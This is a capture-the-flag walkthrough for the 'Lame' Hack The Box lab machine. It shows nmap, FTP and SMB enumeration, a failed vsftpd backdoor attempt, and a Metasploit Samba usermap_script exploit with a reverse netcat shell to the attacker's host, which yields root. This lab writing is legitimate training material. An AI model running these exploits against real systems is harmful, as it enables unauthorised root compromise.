# Lame
- **Arch**: `Linux`
- **Target**: `10.10.10.3`
- **Description**: Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement. 

## Recon
As with nearly all HTB Linux machines, we should be targeting a web server. Let's begin with a nmap scan. I'm using tmux, so I'll also setup some variables to stay persistent between tmux panes. 

```bash
host=10.10.10.3 && tmux setenv host $host && tmux set-option -g update-environment host && ports=$(sudo nmap -p- --min-rate=1000 -T4 $host | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -p$ports -sV -sC $host -oN nmap_tcp.txt
```

### Command Breakdown
This long command does several things at once. 

- `host=10.10.10.3`
Sets an environment variable called `host`. Allows using `$host` instead of needing to remember the IP later.

- `tmux setenv host $host`
Gives the tmux session a copy of the `host` variable, so new panes and windows will inherit the value.

- `tmux set-option -g update-enviroment host`
Tells tmux to include `host` in the global `update-environment` list. Pulls in changes to `host` to new tmux panes.

- `ports=$( ... )`
Setup a `ports` variable that has a comma-seperated listing of the open ports on the machine. This is set during a quick nmap scan, and then used during a deep nmap port scan.

- `sudo nmap -p- --min-rate=1000 -T4 $host`
Runs nmap as root across all TCP ports (`-p-`), with a minimum of 1000 packets per second (`--min-rate=1000`), using the aggressive timing template (`-T4`). Attempts to find all open ports as fast as possible, but without misses.

- `| grep ^[0-9]`
Pipe the nmap output to grep, and filter the lines that start with a digit.

- `| cut -d '/' -f 1`
Split the grep output on a slash, and take the first field (port number).

- `| tr '\n' ','`
Translate new lines into a comma, to create a comma separated list of port numbers.

- `| sed s/,$//`
Perform a substitution to remove the trailing comma.

Result will be a `ports` variable containing a list of port numbers such as `22,80,443`. Now we perform a deep scan.

- `sudo nmap -p$ports`
Run nmap as root and only scan the ports we discoved in the first scan.

- `-sV` and `-sC`
Run version detection (`sV`) and a the common NSE scripts (`sC`) against each port. 

- `-oN nmap_tcp.txt`
Writes the nmap output to a file for later reference. 

### Nmap Output
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-28 10:26 EDT
Nmap scan report for 10.10.10.3
Host is up (0.12s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m22s, deviation: 2h49m45s, median: 19s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-06-28T10:27:33-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.55 seconds
```
Looks like we actually have a file server, instead of a traditional web server. FTP is available, as well as Samba. **distcc** on port **3632** appears to be a distributed compiler for C-style projects. 

### FTP
Checking the FTP service first, we can see from the nmap scan that anonymous login is allowed. We can login, without a password, and perform a directory listing. Nothing comes up. 

```bash
# ftp $host
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||38765|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> exit
221 Goodbye.
```

The FTP server is running `vsftpd 2.3.4`. Let's check if there are any exploits for this version.


```
# searchsploit vsftpd
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                    | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                    | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                    | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                  | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                         | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                            | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                           | multiple/remote/49719.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

It does appear there is a *Backdoor Command Execution* vulnerability in this version. Performing a websearch for `vsftpd 2.3.4 exploit` shows that this is likely **CVE-2011-2523**. 

> vsftpd 2.3.4 downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port 6200/tcp.

4 days is a pretty tight window for the backdoor. There is a python script and metasploit module available to make the attempt. 

```
# msfconsole
msf6 > search vsftpd                                                                                                
                                                          
Matching Modules                                          
================                                                                                                    
                                                                                                                    
   #  Name                                  Disclosure Date  Rank       Check  Description                          
   -  ----                                  ---------------  ----       -----  -----------                          
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service       
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execut
ion                                                                                                                 
                                                                                                                    
                                                                                                                    
Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
                                                                                                                    
msf6 > use 1
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options                                                                
                                                                                                                    
Module options (exploit/unix/ftp/vsftpd_234_backdoor):                                                              
                                                                                                                    
   Name     Current Setting  Required  Description                                                                  
   ----     ---------------  --------  -----------                                                                  
   CHOST                     no        The local client address                                                     
   CPORT                     no        The local client port                                                        
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]                 
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b  
                                       asics/using-metasploit.html                                                  
   RPORT    21               yes       The target port (TCP)                                                        
                                                                                                                    
                                                                                                                    
Exploit target:                                                                                                     
                                                                                                                    
   Id  Name                                                                                                         
   --  ----                                                                                                         
   0   Automatic                                                                                                    
                                                                                                                    
                                                                                                                    
                                                                                                                    
View the full module info with the info, or info -d command.                                                        
                                                          
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS = 10.10.10.3                                                
RHOSTS => = 10.10.10.3                                                                                              
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run                                                                    
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)                                                                      
[*] 10.10.10.3:21 - USER: 331 Please specify the password.                                                          
[*] Exploit completed, but no session was created.
```

No session on our first attempt. Let's keep enumerating, and maybe come back to this later.

### SMB
According to our nmap scan, samba was running `smbd 3.0.20-Debian`. Before checking the version for vulnerabilities, let's look at the shares. 

```
smbclient -L 10.10.10.3                                                                                         
Password for [WORKGROUP\root]:                                                                                      
Anonymous login successful                                                                                          
                                                                                                                    
        Sharename       Type      Comment                                                                           
        ---------       ----      -------                                                                           
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!                                                                          
        opt             Disk       
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful                                
                                                          
        Server               Comment
        ---------            -------
                                                          
        Workgroup            Master
        ---------            -------                      
        WORKGROUP            LAME
```
There are two interesting locations, `tmp` and `opt`. Trying to connect to `opt` is restricted, but we can connect to `tmp`. 

```
smbclient //10.10.10.3/tmp
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jun 29 09:24:03 2025
  ..                                 DR        0  Sat Oct 31 02:33:58 2020
  5547.jsvc_up                        R        0  Sun Jun 29 08:12:34 2025
  .ICE-unix                          DH        0  Sun Jun 29 08:11:31 2025
  vmware-root                        DR        0  Sun Jun 29 08:11:59 2025
  .X11-unix                          DH        0  Sun Jun 29 08:11:57 2025
  .X0-lock                           HR       11  Sun Jun 29 08:11:57 2025
  vgauthsvclog.txt.0                  R     1600  Sun Jun 29 08:11:29 2025

                7282168 blocks of size 1024. 5386564 blocks available
```
There are a couple of files to download, and some directories. `vmware-root` and `5547.jsvc_up` are restricted. We can download the `vgauthsvclog.txt.0` file.
```
smb: \> get vgauthsvclog.txt.0
getting file \vgauthsvclog.txt.0 of size 1600 as vgauthsvclog.txt.0 (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)
```
```
# cat vgauthsvclog.txt.0 
[Jun 29 08:11:29.579] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Jun 29 08:11:29.579] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Jun 29 08:11:29.579] [ message] [VGAuthService] Group 'service'
[Jun 29 08:11:29.579] [ message] [VGAuthService]         samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Jun 29 08:11:29.579] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Jun 29 08:11:29.621] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Jun 29 08:11:29.671] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Jun 29 08:11:29.671] [ message] [VGAuthService] Group 'service'
[Jun 29 08:11:29.671] [ message] [VGAuthService]         samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Jun 29 08:11:29.681] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Jun 29 08:11:29.681] [ message] [VGAuthService] Cannot load message catalog for domain 'VGAuthService', language 'C', catalog dir '.'.
[Jun 29 08:11:29.681] [ message] [VGAuthService] INIT SERVICE
[Jun 29 08:11:29.681] [ message] [VGAuthService] Using '/var/lib/vmware/VGAuth/aliasStore' for alias store root directory
[Jun 29 08:11:29.720] [ message] [VGAuthService] SAMLCreateAndPopulateGrammarPool: Using '/usr/lib/vmware-vgauth/schemas' for SAML schemas
[Jun 29 08:11:29.751] [ message] [VGAuthService] SAML_Init: Allowing 300 of clock skew for SAML date validation
[Jun 29 08:11:29.751] [ message] [VGAuthService] BEGIN SERVICE
```
No immediately useful information here either. Let's check on the samba version.

This version appears to be vulnerable to **CVE-2007-2447**. Metasploit includes a module just for this purpose.

## Exploit
Launch `msfconsole`, and use the `usermap_script` exploit. 

```
msf6 > use exploit/multi/samba/usermap_script                                                                       
[*] No payload configured, defaulting to cmd/unix/reverse_netcat 
msf6 exploit(multi/samba/usermap_script) > show options                                                             
                                                                                                                    
Module options (exploit/multi/samba/usermap_script):                                                                
                                                                                                                    
   Name     Current Setting  Required  Description                                                                  
   ----     ---------------  --------  -----------                                                                  
   CHOST                     no        The local client address                                                     
   CPORT                     no        The local client port                                                        
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]                 
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b  
                                       asics/using-metasploit.html                                                  
   RPORT    139              yes       The target port (TCP)                                                        
                                                                                                                    
                                                                                                                    
Payload options (cmd/unix/reverse_netcat):                                                                          
                                                                                                                    
   Name   Current Setting  Required  Description                                                                    
   ----   ---------------  --------  -----------                                                                    
   LHOST  172.16.0.55      yes       The listen address (an interface may be specified)                             
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf6 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 10.10.14.14:4444 
[*] Command shell session 1 opened (10.10.14.14:4444 -> 10.10.10.3:54570) at 2025-06-29 09:51:48 -0400
```
And just like that, we have a shell in the remote system. 
There is no prompt, but we can start sending commands to the target to enumerate our user, directories, and find the flags. The commands we entered, in order, are: `whoami`, `pwd`, `ls`, `cd home`, `ls`, `cd makis`, `ls`, `cat user.txt`, `cd /root`, `cat root.txt`. 

```
whoami
root
pwd
/
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd home
ls
ftp
makis
service
user
cd makis
ls
user.txt
cat user.txt
<user flag value>
cd /root
cat root.txt
<root flag value>
```

























